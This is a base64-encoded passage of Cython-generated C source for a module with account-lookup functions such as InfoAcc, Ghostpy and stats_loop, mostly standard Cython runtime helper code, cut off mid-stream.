ZG9tYWluLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9hY2NvdW50X2luZm8sIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3VzZXJfaWQsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3VzZXJfaWRfaW50LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9yZWdfZGF0ZSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZm9sbG93ZXJzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9mb2xsb3dpbmcsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2luZm9fdGV4dCwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZiwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3Vfa2V5Ym9hcmQsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2V9OwogICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMTBdID0gX19QeXhfUHlDb2RlX05ldyhkZXNjciwgdmFybmFtZXMsIF9fcHl4X21zdGF0ZS0+X19weXhfa3BfdV9tX2F3X3B5LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9JbmZvQWNjLCBfX3B5eF9rXzlEXzFfbF9hdlFfY19hX3JfMV9PMV8xX19BXzFfM28sIHR1cGxlX2RlZHVwX21hcCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMTBdKSkgZ290byBiYWQ7CiAgfQogIHsKICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MCwgMCwgMCwgOCwgKHVuc2lnbmVkIGludCkoQ09fT1BUSU1JWkVEfENPX05FV0xPQ0FMUyksIDM5NCwgMjEyfTsKICAgIFB5T2JqZWN0KiBjb25zdCB2YXJuYW1lc1tdID0ge19fcHl4X21zdGF0ZS0+X19weXhfbl91X2RhdGEsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2hlYWRlcnMsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3Jlc3BvbnNlLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9hY2NvdW50LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV91c2VybmFtZSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZm9sbG93ZXJzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9lbWFpbCwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZX07CiAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsxMV0gPSBfX1B5eF9QeUNvZGVfTmV3KGRlc2NyLCB2YXJuYW1lcywgX19weXhfbXN0YXRlLT5fX3B5eF9rcF91X21fYXdfcHksIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X0dob3N0cHksIF9fcHl4X2tfMlVfNl9yX3lQUlJTX1YxX2NfcV9hX3QxQV94dUFfOSwgdHVwbGVfZGVkdXBfbWFwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsxMV0pKSBnb3RvIGJhZDsKICB9CiAgewogICAgY29uc3QgX19QeXhfUHlDb2RlX05ld19mdW5jdGlvbl9kZXNjcmlwdGlvbiBkZXNjciA9IHswLCAwLCAwLCAwLCAodW5zaWduZWQgaW50KShDT19PUFRJTUlaRUR8Q09fTkVXTE9DQUxTKSwgNDIxLCAxOX07CiAgICBQeU9iamVjdCogY29uc3QgdmFybmFtZXNbXSA9IHswfTsKICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzEyXSA9IF9fUHl4X1B5Q29kZV9OZXcoZGVzY3IsIHZhcm5hbWVzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X2twX3VfbV9hd19weSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3Vfc3RhdHNfbG9vcCwgX19weXhfa19BX0ZfMSwgdHVwbGVfZGVkdXBfbWFwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsxMl0pKSBnb3RvIGJhZDsKICB9CiAgUHlfREVDUkVGKHR1cGxlX2RlZHVwX21hcCk7CiAgcmV0dXJuIDA7CiAgYmFkOgogIFB5X0RFQ1JFRih0dXBsZV9kZWR1cF9tYXApOwogIHJldHVybiAtMTsKfQoKCnN0YXRpYyBpbnQgX19QeXhfSW5pdEdsb2JhbHModm9pZCkgewogIAogIGlmIChsaWtlbHkoX19QeXhfaW5pdF9jb192YXJpYWJsZXMoKSA9PSAwKSk7IGVsc2UKCmlmICh1bmxpa2VseShQeUVycl9PY2N1cnJlZCgpKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQoKICAKICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQp7CiAgICBQeU9iamVjdCAqdHlwZXNNb2R1bGU9TlVMTDsKICAgIHR5cGVzTW9kdWxlID0gUHlJbXBvcnRfSW1wb3J0TW9kdWxlKCJ0eXBlcyIpOwogICAgaWYgKHR5cGVzTW9kdWxlKSB7CiAgICAgICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19QeXhfQ2FjaGVkTWV0aG9kVHlwZSA9IFB5T2JqZWN0X0dldEF0dHJTdHJpbmcodHlwZXNNb2R1bGUsICJNZXRob2RUeXBlIik7CiAgICAgICAgUHlfREVDUkVGKHR5cGVzTW9kdWxlKTsKICAgIH0KfSAvLyBlcnJvciBoYW5kbGluZyBmb2xsb3dzCiNlbmRpZgoKaWYgKHVubGlrZWx5KFB5RXJyX09jY3VycmVkKCkpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCgogIHJldHVybiAwOwogIF9fcHl4X0wxX2Vycm9yOjsKICByZXR1cm4gLTE7Cn0KCgoKCiNpZmRlZiBfTVNDX1ZFUgojcHJhZ21hIHdhcm5pbmcoIHB1c2ggKQoKI3ByYWdtYSB3YXJuaW5nKCBkaXNhYmxlIDogNDEyNyApCiNlbmRpZgoKCgoKCgoKI2lmIENZVEhPTl9SRUZOQU5OWQpzdGF0aWMgX19QeXhfUmVmTmFubnlBUElTdHJ1Y3QgKl9fUHl4X1JlZk5hbm55SW1wb3J0QVBJKGNvbnN0IGNoYXIgKm1vZG5hbWUpIHsKICAgIFB5T2JqZWN0ICptID0gTlVMTCwgKnAgPSBOVUxMOwogICAgdm9pZCAqciA9IE5VTEw7CiAgICBtID0gUHlJbXBvcnRfSW1wb3J0TW9kdWxlKG1vZG5hbWUpOwogICAgaWYgKCFtKSBnb3RvIGVuZDsKICAgIHAgPSBQeU9iamVjdF9HZXRBdHRyU3RyaW5nKG0sICJSZWZOYW5ueUFQSSIpOwogICAgaWYgKCFwKSBnb3RvIGVuZDsKICAgIHIgPSBQeUxvbmdfQXNWb2lkUHRyKHApOwplbmQ6CiAgICBQeV9YREVDUkVGKHApOwogICAgUHlfWERFQ1JFRihtKTsKICAgIHJldHVybiAoX19QeXhfUmVmTmFubnlBUElTdHJ1Y3QgKilyOwp9CiNlbmRpZgoKCiNpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEUKc3RhdGljIGludCBfX1B5eF9QeUVycl9FeGNlcHRpb25NYXRjaGVzVHVwbGUoUHlPYmplY3QgKmV4Y190eXBlLCBQeU9iamVjdCAqdHVwbGUpIHsKICAgIFB5X3NzaXplX3QgaSwgbjsKICAgIG4gPSBQeVR1cGxlX0dFVF9TSVpFKHR1cGxlKTsKICAgIGZvciAoaT0wOyBpPG47IGkrKykgewogICAgICAgIGlmIChleGNfdHlwZSA9PSBQeVR1cGxlX0dFVF9JVEVNKHR1cGxlLCBpKSkgcmV0dXJuIDE7CiAgICB9CiAgICBmb3IgKGk9MDsgaTxuOyBpKyspIHsKICAgICAgICBpZiAoX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKGV4Y190eXBlLCBQeVR1cGxlX0dFVF9JVEVNKHR1cGxlLCBpKSkpIHJldHVybiAxOwogICAgfQogICAgcmV0dXJuIDA7Cn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5RXJyX0V4Y2VwdGlvbk1hdGNoZXNJblN0YXRlKFB5VGhyZWFkU3RhdGUqIHRzdGF0ZSwgUHlPYmplY3QqIGVycikgewogICAgaW50IHJlc3VsdDsKICAgIFB5T2JqZWN0ICpleGNfdHlwZTsKI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwQTYKICAgIFB5T2JqZWN0ICpjdXJyZW50X2V4Y2VwdGlvbiA9IHRzdGF0ZS0+Y3VycmVudF9leGNlcHRpb247CiAgICBpZiAodW5saWtlbHkoIWN1cnJlbnRfZXhjZXB0aW9uKSkgcmV0dXJuIDA7CiAgICBleGNfdHlwZSA9IChQeU9iamVjdCopIFB5X1RZUEUoY3VycmVudF9leGNlcHRpb24pOwogICAgaWYgKGV4Y190eXBlID09IGVycikgcmV0dXJuIDE7CiNlbHNlCiAgICBleGNfdHlwZSA9IHRzdGF0ZS0+Y3VyZXhjX3R5cGU7CiAgICBpZiAoZXhjX3R5cGUgPT0gZXJyKSByZXR1cm4gMTsKICAgIGlmICh1bmxpa2VseSghZXhjX3R5cGUpKSByZXR1cm4gMDsKI2VuZGlmCiAgICAjaWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMKICAgIFB5X0lOQ1JFRihleGNfdHlwZSk7CiAgICAjZW5kaWYKICAgIGlmICh1bmxpa2VseShQeVR1cGxlX0NoZWNrKGVycikpKSB7CiAgICAgICAgcmVzdWx0ID0gX19QeXhfUHlFcnJfRXhjZXB0aW9uTWF0Y2hlc1R1cGxlKGV4Y190eXBlLCBlcnIpOwogICAgfSBlbHNlIHsKICAgICAgICByZXN1bHQgPSBfX1B5eF9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMoZXhjX3R5cGUsIGVycik7CiAgICB9CiAgICAjaWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMKICAgIFB5X0RFQ1JFRihleGNfdHlwZSk7CiAgICAjZW5kaWYKICAgIHJldHVybiByZXN1bHQ7Cn0KI2VuZGlmCgoKI2lmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURQpzdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X0VyclJlc3RvcmVJblN0YXRlKFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSwgUHlPYmplY3QgKnR5cGUsIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKnRiKSB7CiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMEE2CiAgICBQeU9iamVjdCAqdG1wX3ZhbHVlOwogICAgYXNzZXJ0KHR5cGUgPT0gTlVMTCB8fCAodmFsdWUgIT0gTlVMTCAmJiB0eXBlID09IChQeU9iamVjdCopIFB5X1RZUEUodmFsdWUpKSk7CiAgICBpZiAodmFsdWUpIHsKICAgICAgICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OCiAgICAgICAgaWYgKHVubGlrZWx5KCgoUHlCYXNlRXhjZXB0aW9uT2JqZWN0KikgdmFsdWUpLT50cmFjZWJhY2sgIT0gdGIpKQogICAgICAgICNlbmRpZgogICAgICAgICAgICBQeUV4Y2VwdGlvbl9TZXRUcmFjZWJhY2sodmFsdWUsIHRiKTsKICAgIH0KICAgIHRtcF92YWx1ZSA9IHRzdGF0ZS0+Y3VycmVudF9leGNlcHRpb247CiAgICB0c3RhdGUtPmN1cnJlbnRfZXhjZXB0aW9uID0gdmFsdWU7CiAgICBQeV9YREVDUkVGKHRtcF92YWx1ZSk7CiAgICBQeV9YREVDUkVGKHR5cGUpOwogICAgUHlfWERFQ1JFRih0Yik7CiNlbHNlCiAgICBQeU9iamVjdCAqdG1wX3R5cGUsICp0bXBfdmFsdWUsICp0bXBfdGI7CiAgICB0bXBfdHlwZSA9IHRzdGF0ZS0+Y3VyZXhjX3R5cGU7CiAgICB0bXBfdmFsdWUgPSB0c3RhdGUtPmN1cmV4Y192YWx1ZTsKICAgIHRtcF90YiA9IHRzdGF0ZS0+Y3VyZXhjX3RyYWNlYmFjazsKICAgIHRzdGF0ZS0+Y3VyZXhjX3R5cGUgPSB0eXBlOwogICAgdHN0YXRlLT5jdXJleGNfdmFsdWUgPSB2YWx1ZTsKICAgIHRzdGF0ZS0+Y3VyZXhjX3RyYWNlYmFjayA9IHRiOwogICAgUHlfWERFQ1JFRih0bXBfdHlwZSk7CiAgICBQeV9YREVDUkVGKHRtcF92YWx1ZSk7CiAgICBQeV9YREVDUkVGKHRtcF90Yik7CiNlbmRpZgp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfRXJyRmV0Y2hJblN0YXRlKFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSwgUHlPYmplY3QgKip0eXBlLCBQeU9iamVjdCAqKnZhbHVlLCBQeU9iamVjdCAqKnRiKSB7CiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMEE2CiAgICBQeU9iamVjdCogZXhjX3ZhbHVlOwogICAgZXhjX3ZhbHVlID0gdHN0YXRlLT5jdXJyZW50X2V4Y2VwdGlvbjsKICAgIHRzdGF0ZS0+Y3VycmVudF9leGNlcHRpb24gPSAwOwogICAgKnZhbHVlID0gZXhjX3ZhbHVlOwogICAgKnR5cGUgPSBOVUxMOwogICAgKnRiID0gTlVMTDsKICAgIGlmIChleGNfdmFsdWUpIHsKICAgICAgICAqdHlwZSA9IChQeU9iamVjdCopIFB5X1RZUEUoZXhjX3ZhbHVlKTsKICAgICAgICBQeV9JTkNSRUYoKnR5cGUpOwogICAgICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04KICAgICAgICAqdGIgPSAoKFB5QmFzZUV4Y2VwdGlvbk9iamVjdCopIGV4Y192YWx1ZSktPnRyYWNlYmFjazsKICAgICAgICBQeV9YSU5DUkVGKCp0Yik7CiAgICAgICAgI2Vsc2UKICAgICAgICAqdGIgPSBQeUV4Y2VwdGlvbl9HZXRUcmFjZWJhY2soZXhjX3ZhbHVlKTsKICAgICAgICAjZW5kaWYKICAgIH0KI2Vsc2UKICAgICp0eXBlID0gdHN0YXRlLT5jdXJleGNfdHlwZTsKICAgICp2YWx1ZSA9IHRzdGF0ZS0+Y3VyZXhjX3ZhbHVlOwogICAgKnRiID0gdHN0YXRlLT5jdXJleGNfdHJhY2ViYWNrOwogICAgdHN0YXRlLT5jdXJleGNfdHlwZSA9IDA7CiAgICB0c3RhdGUtPmN1cmV4Y192YWx1ZSA9IDA7CiAgICB0c3RhdGUtPmN1cmV4Y190cmFjZWJhY2sgPSAwOwojZW5kaWYKfQojZW5kaWYKCgojaWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKFB5T2JqZWN0KiBvYmosIFB5T2JqZWN0KiBhdHRyX25hbWUpIHsKICAgIFB5VHlwZU9iamVjdCogdHAgPSBQeV9UWVBFKG9iaik7CiAgICBpZiAobGlrZWx5KHRwLT50cF9nZXRhdHRybykpCiAgICAgICAgcmV0dXJuIHRwLT50cF9nZXRhdHRybyhvYmosIGF0dHJfbmFtZSk7CiAgICByZXR1cm4gUHlPYmplY3RfR2V0QXR0cihvYmosIGF0dHJfbmFtZSk7Cn0KI2VuZGlmCgoKI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPCAweDAzMGQwMDAwCnN0YXRpYyB2b2lkIF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHJfQ2xlYXJBdHRyaWJ1dGVFcnJvcih2b2lkKSB7CiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmUKICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduCiAgICBpZiAobGlrZWx5KF9fUHl4X1B5RXJyX0V4Y2VwdGlvbk1hdGNoZXMoUHlFeGNfQXR0cmlidXRlRXJyb3IpKSkKICAgICAgICBfX1B5eF9QeUVycl9DbGVhcigpOwp9CiNlbmRpZgpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfR2V0QXR0clN0ck5vRXJyb3IoUHlPYmplY3QqIG9iaiwgUHlPYmplY3QqIGF0dHJfbmFtZSkgewogICAgUHlPYmplY3QgKnJlc3VsdDsKI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMAogICAgKHZvaWQpIFB5T2JqZWN0X0dldE9wdGlvbmFsQXR0cihvYmosIGF0dHJfbmFtZSwgJnJlc3VsdCk7CiAgICByZXR1cm4gcmVzdWx0OwojZWxzZQojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OICYmIENZVEhPTl9VU0VfVFlQRV9TTE9UUwogICAgUHlUeXBlT2JqZWN0KiB0cCA9IFB5X1RZUEUob2JqKTsKICAgIGlmIChsaWtlbHkodHAtPnRwX2dldGF0dHJvID09IFB5T2JqZWN0X0dlbmVyaWNHZXRBdHRyKSkgewogICAgICAgIHJldHVybiBfUHlPYmplY3RfR2VuZXJpY0dldEF0dHJXaXRoRGljdChvYmosIGF0dHJfbmFtZSwgTlVMTCwgMSk7CiAgICB9CiNlbmRpZgogICAgcmVzdWx0ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihvYmosIGF0dHJfbmFtZSk7CiAgICBpZiAodW5saWtlbHkoIXJlc3VsdCkpIHsKICAgICAgICBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyX0NsZWFyQXR0cmlidXRlRXJyb3IoKTsKICAgIH0KICAgIHJldHVybiByZXN1bHQ7CiNlbmRpZgp9CgoKc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9HZXRCdWlsdGluTmFtZShQeU9iamVjdCAqbmFtZSkgewogICAgUHlPYmplY3QqIHJlc3VsdCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHJOb0Vycm9yKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2IsIG5hbWUpOwogICAgaWYgKHVubGlrZWx5KCFyZXN1bHQpICYmICFQeUVycl9PY2N1cnJlZCgpKSB7CiAgICAgICAgUHlFcnJfRm9ybWF0KFB5RXhjX05hbWVFcnJvciwKICAgICAgICAgICAgIm5hbWUgJyVVJyBpcyBub3QgZGVmaW5lZCIsIG5hbWUpOwogICAgfQogICAgcmV0dXJuIHJlc3VsdDsKfQoKCiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OICYmIENZVEhPTl9NRVRIX0ZBU1RDQUxMCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICoKX19QeXhfUHlUdXBsZV9Gcm9tQXJyYXkoUHlPYmplY3QgKmNvbnN0ICpzcmMsIFB5X3NzaXplX3QgbikKewogICAgUHlPYmplY3QgKnJlczsKICAgIFB5X3NzaXplX3QgaTsKICAgIGlmIChuIDw9IDApIHsKICAgICAgICByZXR1cm4gX19QeXhfTmV3UmVmKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3R1cGxlKTsKICAgIH0KICAgIHJlcyA9IFB5VHVwbGVfTmV3KG4pOwogICAgaWYgKHVubGlrZWx5KHJlcyA9PSBOVUxMKSkgcmV0dXJuIE5VTEw7CiAgICBmb3IgKGkgPSAwOyBpIDwgbjsgaSsrKSB7CiAgICAgICAgaWYgKHVubGlrZWx5KF9fUHl4X1B5VHVwbGVfU0VUX0lURU0ocmVzLCBpLCBzcmNbaV0pIDwgKDApKSkgewogICAgICAgICAgICBQeV9ERUNSRUYocmVzKTsKICAgICAgICAgICAgcmV0dXJuIE5VTEw7CiAgICAgICAgfQogICAgICAgIFB5X0lOQ1JFRihzcmNbaV0pOwogICAgfQogICAgcmV0dXJuIHJlczsKfQojZWxpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04Kc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9jb3B5X29iamVjdF9hcnJheShQeU9iamVjdCAqY29uc3QgKkNZVEhPTl9SRVNUUklDVCBzcmMsIFB5T2JqZWN0KiogQ1lUSE9OX1JFU1RSSUNUIGRlc3QsIFB5X3NzaXplX3QgbGVuZ3RoKSB7CiAgICBQeU9iamVjdCAqdjsKICAgIFB5X3NzaXplX3QgaTsKICAgIGZvciAoaSA9IDA7IGkgPCBsZW5ndGg7IGkrKykgewogICAgICAgIHYgPSBkZXN0W2ldID0gc3JjW2ldOwogICAgICAgIFB5X0lOQ1JFRih2KTsKICAgIH0KfQpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqCl9fUHl4X1B5VHVwbGVfRnJvbUFycmF5KFB5T2JqZWN0ICpjb25zdCAqc3JjLCBQeV9zc2l6ZV90IG4pCnsKICAgIFB5T2JqZWN0ICpyZXM7CiAgICBpZiAobiA8PSAwKSB7CiAgICAgICAgcmV0dXJuIF9fUHl4X05ld1JlZihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV90dXBsZSk7CiAgICB9CiAgICByZXMgPSBQeVR1cGxlX05ldyhuKTsKICAgIGlmICh1bmxpa2VseShyZXMgPT0gTlVMTCkpIHJldHVybiBOVUxMOwogICAgX19QeXhfY29weV9vYmplY3RfYXJyYXkoc3JjLCAoKFB5VHVwbGVPYmplY3QqKXJlcyktPm9iX2l0ZW0sIG4pOwogICAgcmV0dXJuIHJlczsKfQpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqCl9fUHl4X1B5TGlzdF9Gcm9tQXJyYXkoUHlPYmplY3QgKmNvbnN0ICpzcmMsIFB5X3NzaXplX3QgbikKewogICAgUHlPYmplY3QgKnJlczsKICAgIGlmIChuIDw9IDApIHsKICAgICAgICByZXR1cm4gUHlMaXN0X05ldygwKTsKICAgIH0KICAgIHJlcyA9IFB5TGlzdF9OZXcobik7CiAgICBpZiAodW5saWtlbHkocmVzID09IE5VTEwpKSByZXR1cm4gTlVMTDsKICAgIF9fUHl4X2NvcHlfb2JqZWN0X2FycmF5KHNyYywgKChQeUxpc3RPYmplY3QqKXJlcyktPm9iX2l0ZW0sIG4pOwogICAgcmV0dXJuIHJlczsKfQojZW5kaWYKCgpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlCeXRlc19FcXVhbHMoUHlPYmplY3QqIHMxLCBQeU9iamVjdCogczIsIGludCBlcXVhbHMpIHsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fR1JBQUwgfHxcCiAgICAgICAgIShDWVRIT05fQVNTVU1FX1NBRkVfU0laRSAmJiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TKQogICAgcmV0dXJuIFB5T2JqZWN0X1JpY2hDb21wYXJlQm9vbChzMSwgczIsIGVxdWFscyk7CiNlbHNlCiAgICBpZiAoczEgPT0gczIpIHsKICAgICAgICByZXR1cm4gKGVxdWFscyA9PSBQeV9FUSk7CiAgICB9IGVsc2UgaWYgKFB5Qnl0ZXNfQ2hlY2tFeGFjdChzMSkgJiBQeUJ5dGVzX0NoZWNrRXhhY3QoczIpKSB7CiAgICAgICAgY29uc3QgY2hhciAqcHMxLCAqcHMyOwogICAgICAgIFB5X3NzaXplX3QgbGVuZ3RoID0gUHlCeXRlc19HRVRfU0laRShzMSk7CiAgICAgICAgaWYgKGxlbmd0aCAhPSBQeUJ5dGVzX0dFVF9TSVpFKHMyKSkKICAgICAgICAgICAgcmV0dXJuIChlcXVhbHMgPT0gUHlfTkUpOwogICAgICAgIHBzMSA9IFB5Qnl0ZXNfQVNfU1RSSU5HKHMxKTsKICAgICAgICBwczIgPSBQeUJ5dGVzX0FTX1NUUklORyhzMik7CiAgICAgICAgaWYgKHBzMVswXSAhPSBwczJbMF0pIHsKICAgICAgICAgICAgcmV0dXJuIChlcXVhbHMgPT0gUHlfTkUpOwogICAgICAgIH0gZWxzZSBpZiAobGVuZ3RoID09IDEpIHsKICAgICAgICAgICAgcmV0dXJuIChlcXVhbHMgPT0gUHlfRVEpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGludCByZXN1bHQ7CiNpZiBDWVRIT05fVVNFX1VOSUNPREVfSU5URVJOQUxTICYmIChQWV9WRVJTSU9OX0hFWCA8IDB4MDMwQjAwMDApCiAgICAgICAgICAgIFB5X2hhc2hfdCBoYXNoMSwgaGFzaDI7CiAgICAgICAgICAgIGhhc2gxID0gKChQeUJ5dGVzT2JqZWN0KilzMSktPm9iX3NoYXNoOwogICAgICAgICAgICBoYXNoMiA9ICgoUHlCeXRlc09iamVjdCopczIpLT5vYl9zaGFzaDsKICAgICAgICAgICAgaWYgKGhhc2gxICE9IGhhc2gyICYmIGhhc2gxICE9IC0xICYmIGhhc2gyICE9IC0xKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gKGVxdWFscyA9PSBQeV9ORSk7CiAgICAgICAgICAgIH0KI2VuZGlmCiAgICAgICAgICAgIHJlc3VsdCA9IG1lbWNtcChwczEsIHBzMiwgKHNpemVfdClsZW5ndGgpOwogICAgICAgICAgICByZXR1cm4gKGVxdWFscyA9PSBQeV9FUSkgPyAocmVzdWx0ID09IDApIDogKHJlc3VsdCAhPSAwKTsKICAgICAgICB9CiAgICB9IGVsc2UgaWYgKChzMSA9PSBQeV9Ob25lKSAmIFB5Qnl0ZXNfQ2hlY2tFeGFjdChzMikpIHsKICAgICAgICByZXR1cm4gKGVxdWFscyA9PSBQeV9ORSk7CiAgICB9IGVsc2UgaWYgKChzMiA9PSBQeV9Ob25lKSAmIFB5Qnl0ZXNfQ2hlY2tFeGFjdChzMSkpIHsKICAgICAgICByZXR1cm4gKGVxdWFscyA9PSBQeV9ORSk7CiAgICB9IGVsc2UgewogICAgICAgIGludCByZXN1bHQ7CiAgICAgICAgUHlPYmplY3QqIHB5X3Jlc3VsdCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKHMxLCBzMiwgZXF1YWxzKTsKICAgICAgICBpZiAoIXB5X3Jlc3VsdCkKICAgICAgICAgICAgcmV0dXJuIC0xOwogICAgICAgIHJlc3VsdCA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShweV9yZXN1bHQpOwogICAgICAgIFB5X0RFQ1JFRihweV9yZXN1bHQpOwogICAgICAgIHJldHVybiByZXN1bHQ7CiAgICB9CiNlbmRpZgp9CgoKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5VW5pY29kZV9FcXVhbHMoUHlPYmplY3QqIHMxLCBQeU9iamVjdCogczIsIGludCBlcXVhbHMpIHsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fR1JBQUwKICAgIHJldHVybiBQeU9iamVjdF9SaWNoQ29tcGFyZUJvb2woczEsIHMyLCBlcXVhbHMpOwojZWxzZQogICAgaW50IHMxX2lzX3VuaWNvZGUsIHMyX2lzX3VuaWNvZGU7CiAgICBpZiAoczEgPT0gczIpIHsKICAgICAgICBnb3RvIHJldHVybl9lcTsKICAgIH0KICAgIHMxX2lzX3VuaWNvZGUgPSBQeVVuaWNvZGVfQ2hlY2tFeGFjdChzMSk7CiAgICBzMl9pc191bmljb2RlID0gUHlVbmljb2RlX0NoZWNrRXhhY3QoczIpOwogICAgaWYgKHMxX2lzX3VuaWNvZGUgJiBzMl9pc191bmljb2RlKSB7CiAgICAgICAgUHlfc3NpemVfdCBsZW5ndGgsIGxlbmd0aDI7CiAgICAgICAgaW50IGtpbmQ7CiAgICAgICAgdm9pZCAqZGF0YTEsICpkYXRhMjsKICAgICAgICAjaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgICAgICBpZiAodW5saWtlbHkoX19QeXhfUHlVbmljb2RlX1JFQURZKHMxKSA8IDApIHx8IHVubGlrZWx5KF9fUHl4X1B5VW5pY29kZV9SRUFEWShzMikgPCAwKSkKICAgICAgICAgICAgcmV0dXJuIC0xOwogICAgICAgICNlbmRpZgogICAgICAgIGxlbmd0aCA9IF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKHMxKTsKICAgICAgICAjaWYgIUNZVEhPTl9BU1NVTUVfU0FGRV9TSVpFCiAgICAgICAgaWYgKHVubGlrZWx5KGxlbmd0aCA8IDApKSByZXR1cm4gLTE7CiAgICAgICAgI2VuZGlmCiAgICAgICAgbGVuZ3RoMiA9IF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKHMyKTsKICAgICAgICAjaWYgIUNZVEhPTl9BU1NVTUVfU0FGRV9TSVpFCiAgICAgICAgaWYgKHVubGlrZWx5KGxlbmd0aDIgPCAwKSkgcmV0dXJuIC0xOwogICAgICAgICNlbmRpZgogICAgICAgIGlmIChsZW5ndGggIT0gbGVuZ3RoMikgewogICAgICAgICAgICBnb3RvIHJldHVybl9uZTsKIC